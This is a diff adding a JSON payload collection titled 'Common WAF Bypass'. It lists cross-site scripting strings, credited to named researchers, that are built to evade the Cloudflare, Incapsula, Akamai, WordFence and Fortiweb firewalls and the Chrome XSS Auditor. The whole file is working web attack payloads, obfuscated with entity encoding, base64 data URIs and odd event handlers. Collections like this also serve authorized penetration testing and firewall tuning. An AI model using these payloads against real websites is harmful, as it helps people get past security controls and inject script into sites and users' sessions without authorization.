@@ -1,0 +1,137 @@
+{
+  "category": "Common WAF Bypass",
+  "keyword": "WAF_bypass",
+  "payloads": [
+    {
+      "type": "Cloudflare",
+      "tech": ["WAF_bypass"],
+      "payload": "<svg/onrandom=random onload=confirm(1)>",
+      "author": "@Bohdan Korzhynskyi",
+      "date": "25st January 2021"
+    },
+    {
+      "type": "Cloudflare",
+      "tech": ["WAF_bypass"],
+      "payload": "<video onnull=null onmouseover=confirm(1)>",
+      "author": "@Bohdan Korzhynskyi",
+      "date": "25st January 2021"
+    },
+    {
+      "type": "Cloudflare",
+      "tech": ["WAF_bypass"],
+      "payload": "<svg/OnLoad=\"`${prompt``}`\">",
+      "author": "@Bohdan Korzhynskyi",
+      "date": "21st April 2020"
+    },
+    {
+      "type": "Cloudflare",
+      "tech": ["WAF_bypass"],
+      "payload": "<svg/onload=%26nbsp;alert`bohdan`+",
+      "author": "@Bohdan Korzhynskyi",
+      "date": "22nd August 2019"
+    },
+    {
+      "type": "Cloudflare",
+      "tech": ["WAF_bypass"],
+      "payload": "1'\"\"><img/src/onerror=.1|alert``>",
+      "author": "@Bohdan Korzhynskyi",
+      "date": "5th June 2019"
+    },
+    {
+      "type": "Cloudflare",
+      "tech": ["WAF_bypass"],
+      "payload": "<svg onload=prompt%26%230000000040document.domain)>",
+      "author": "@Bohdan Korzhynskyi",
+      "date": "3rd June 2019"
+    },
+    {
+      "type": "Cloudflare",
+      "tech": ["WAF_bypass"],
+      "payload": "<svg onload=prompt%26%23x000000028;document.domain)>",
+      "author": "@Bohdan Korzhynskyi",
+      "date": "3rd June 2019"
+    },
+    {
+      "type": "Cloudflare",
+      "tech": ["WAF_bypass"],
+      "payload": "xss'\"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>",
+      "author": "@Bohdan Korzhynskyi",
+      "date": "3rd June 2019"
+    },
+    {
+      "type": "Cloudflare",
+      "tech": ["WAF_bypass"],
+      "payload": "<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f",
+      "author": "@RakeshMane10",
+      "date": "22nd March 2019"
+    },
+    {
+      "type": "Cloudflare",
+      "tech": ["WAF_bypass"],
+      "payload": "<a href=\"j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;\">X</a>",
+      "date": "27th February 2018"
+    },
+    {
+      "type": "Chrome Auditor",
+      "tech": ["WAF_bypass"],
+      "payload": "</script><svg><script>alert(1)-%26apos%3B",
+      "date": "9th August 2018"
+    },
+    {
+      "type": "Incapsula WAF",
+      "tech": ["WAF_bypass"],
+      "payload": "<svg onload\\r\\n=$.globalEval(\"al\"+\"ert()\");>",
+      "author": "@daveysec",
+      "date": "11th May 2019"
+    },
+    {
+      "type": "Incapsula WAF",
+      "tech": ["WAF_bypass"],
+      "payload": "anythinglr00</script><script>alert(document.domain)</script>uxldz",
+      "author": "@Alra3ees",
+      "date": "8th March 2018"
+    },
+    {
+      "type": "Incapsula WAF",
+      "tech": ["WAF_bypass"],
+      "payload": "anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz",
+      "author": "@Alra3ees",
+      "date": "8th March 2018"
+    },
+    {
+      "type": "Incapsula WAF",
+      "tech": ["WAF_bypass"],
+      "payload": "<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg='></object>",
+      "author": "@c0d3G33k",
+      "date": "11th September 2018"
+    },
+    {
+      "type": "Akamai WAF",
+      "tech": ["WAF_bypass"],
+      "payload": "?\"\"></script><base%20c%3D=href%3Dhttps:\\mysite>",
+      "author": "@zseano",
+      "date": "18th June 2018"
+    },
+    {
+      "type": "Akamai WAF",
+      "tech": ["WAF_bypass"],
+      "payload": "<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>",
+      "author": "@s0md3v",
+      "date": "28th October 2018"
+    },
+    {
+      "type": "WordFence WAF",
+      "tech": ["WAF_bypass"],
+      "payload": "<a href=javas&#99;ript:alert(1)>",
+      "author": "@brutelogic",
+      "date": "12th September 2018"
+    },
+    {
+      "type": "Fortiweb WAF",
+      "tech": ["WAF_bypass"],
+      "payload": "\\u003e\\u003c\\u0068\\u0031 onclick=alert('1')\\u003e",
+      "author": "@rezaduty",
+      "date": "9th July 2019"
+    }
+  ]
+}
